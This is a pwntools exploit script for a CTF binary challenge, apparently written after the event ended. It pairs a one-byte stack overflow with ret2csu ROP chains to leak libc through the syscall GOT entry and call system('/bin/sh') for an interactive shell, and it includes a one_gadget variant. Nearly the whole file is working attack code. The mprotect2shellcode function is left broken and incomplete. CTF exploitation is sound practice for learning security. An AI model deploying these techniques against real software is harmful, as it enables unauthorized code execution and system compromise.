#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '34.101.122.7', 10001

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x40134a
break *0x401319
break *0x401379
'''.format(**locals())

def csuPayload(rdi, rsi, rdx, func, ret):
    csu = flat([
        p64(csu1),
        p64(0),         # rbx - set to 0 since it will be incremented later
        p64(1),         # rbp - set to 1 so when compared to the incremented rbx results in equality
        p64(rdi),       # r12 = rdi
        p64(rsi),       # r13 = rsi
        p64(rdx),       # r14 = rdx
        p64(func),      # r15 = call QWORD PTR [r15+rbx*8]
        p64(csu2),
        p64(0),         # add rsp, 8 -> padding
        p64(0) * 5,     # rbx, rbp, r12, r13, r14
        p64(0),         # r15
        p64(ret),
    ])
    
    return csu

# =========================================================
#                         EXPLOITS
# =========================================================
# Solved After CTF has ended
csu1 = 0x4013da     # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu2 = 0x4013c0     # mov rdx, r14; mov rsi, r13; mov edi, r12d; call QWORD PTR [r15+rbx*8]; ...csu1;
pops = 0x4013dc     # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
add_byte = 0x40113c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
ret = 0x40101a
pop_rdi = 0x4013e3

# heavily referenced by boys who cry's linz solver
def ret2one_gadget():
    global io
    io = initialize()
    
    # calculating offset between syscall and one_gadget to be added
    og = [0xe3afe, 0xe3b01, 0xe3b04]
    syscall_offset = 0x118720
    if libc.sym['syscall'] > og[0]:
        one_gadget_offset = og[0] - syscall_offset
    else:
        one_gadget_offset = syscall_offset - og[0]

    # one byte overflow
    payload = b'\x72'*0x18 + b'\xb8'
    io.sendafter(b'message to:', payload)

    # ret2one_gadget
    payload = flat([
        csu1,
        0xfffcb3de,                 # rbx, this should be one_gadget_offset, but somehow syscall_offset is not correct on remote
        elf.got['syscall'] + 0x3d,  # rbp
        p64(0x00) * 4,              # r12, r13, r14, r15
        add_byte,
        elf.plt['syscall']          # call one_gadget
    ])
    io.sendlineafter(b'to send:', payload)
    io.sendline(b'ls')
    
    io.interactive()
    
# i have no idea how this works here, 
# even changing a single byte of the off by one with
# drastically changes success percentange of your payload 
# refer to official_solver.py by Lychnobyte
def ret2system():
    global io
    io = initialize()
    
    # one byte overflow
    payload = b'P'*0x18 + b'\xc8'
    io.sendafter(b'message to:', payload)

    # leaking libc
    syscall = elf.got['syscall']
    # syscall(rax=0) -> read(1, 1, got.syscall)
    payload = csuPayload(1, 1, syscall, func=syscall, ret=elf.sym['main'])
    io.sendlineafter(b'to send:', payload)
    
    io.recvline()
    libc.address = 0
    leak = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = leak - libc.sym['syscall']
    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym['system']
    
    # logging information
    info('leak: %#x', leak)
    info('libc address: %#x', libc.address)
    info('binsh: %#x', binsh)
    info('system: %#x', system)
    
    # one byte overflow
    payload = b'P'*0x18 + b'\xf8'
    io.sendafter(b'message to:', payload)
    
    # ret2system
    ropchain = b'P'*80
    ropchain += flat([
        p64(ret),
        p64(pop_rdi),
        p64(binsh),
        p64(system)
    ])
    # payload = b'A' * 80 # padding
    # payload += flat(
    #     {120 - len(ropchain) : ropchain},
    #     filler=p64(0x40101a) # retslide
    # )
    io.sendlineafter(b'to send:', ropchain)
    
    io.interactive()

# unproven here, refer to Team Jual SSD 256GB 200K writeup    
def mprotect2shellcode():
    # one byte overflow
    payload = b'\x72'*0x18 + b'\xb8'
    io.sendafter(b'message to:', payload)
    
    def writeChain(addr, data):
        return flat([
            csu1,
            data,           # rbx = data to be written
            addr + 0x3d,    # rbp = addr for data to be written
            p64(0) * 4,     # r12, r13, r14, r15
            # ret
        ])
    
    bss = elf.bss()
    # stage 1: 
    payload = flat([
        writeChain(bss, )
    ])
    io.sendlineafter(b'to send:', payload)
    
if __name__ == '__main__':
    attempt = 0
    while True:
        try:
            attempt += 1
            info(f'attempts = {attempt}')            
            # ret2one_gadget()
            ret2system()
        except Exception as err:
            io.close()
            continue
        else:
            break

            
    
    